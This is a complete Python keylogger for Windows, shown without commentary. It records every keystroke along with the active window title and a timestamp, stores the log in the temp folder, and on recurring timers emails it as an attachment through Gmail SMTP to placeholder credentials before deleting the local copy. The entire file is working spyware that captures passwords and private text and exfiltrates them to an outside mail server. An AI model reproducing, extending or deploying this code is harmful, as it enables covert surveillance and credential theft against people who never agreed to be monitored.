from pynput.keyboard import Listener
import tempfile,threading,os
import smtplib
from email.mime.text import MIMEText
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import win32gui
from datetime import datetime

class Keylogger:
    def __init__(self, email, passwd):
        self.string = ''
        self.email = email
        self.passwd = passwd
        self.window = ''
        os.chdir(tempfile.gettempdir())

    def get_window_name(self):
        w = win32gui
        return w.GetWindowText (w.GetForegroundWindow())

    def onpress(self,key):
        if self.window != self.get_window_name():
            self.window = self.get_window_name()
            self.string += "\n\n[ " + self.window + " ("+ datetime.now().strftime("%m/%d/%Y, %Hh%Mm%Ss") + ")]\n"
        try:
            self.string += key.char
        except AttributeError:
            if str(key) == "Key.space":
                self.string += " "
            elif str(key) == "Key.enter":
                self.string += '\n'
            elif str(key) == "Key.shift":
                pass
            else:
                self.string += ' ' + str(key).strip('Key.') + ' '
        except:
            self.string += "??"

    def log(self):
        with open("log.txt","a") as f:
            f.write(self.string)
            self.string = ""
            self.report()
            thread = threading.Timer(15,self.log)
            thread.start()
    
    def report(self):
        try:
            if os.stat('log.txt').st_size > 2000:
                self.send_mail('log.txt')
                os.remove('log.txt')
        except FileNotFoundError:
            pass
        thread = threading.Timer(900,self.log)
        thread.start()
            
    def send_mail(self,file):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(self.email, self.passwd)
        m = MIMEMultipart()
        m['To'] = self.email
        m['From'] = self.email
        m['Subject'] = "keylogger file"
        f = open(file,"rb")
        msg = MIMEBase('multipart', 'plain')
        msg.set_payload(f.read())
        f.close()
        encoders.encode_base64(msg)
        msg.add_header('Content-Disposition',
                            'attachment', filename=file)
        m.attach(msg)
        server.sendmail(self.email,self.email ,m.as_string())
        server.quit()

    def run(self):
        self.report()
        self.log()
        with Listener(on_press=self.onpress) as listener:
            listener.join()

logger = Keylogger(YOUR_EMAIL,YOUR_PASSWORD)
logger.run()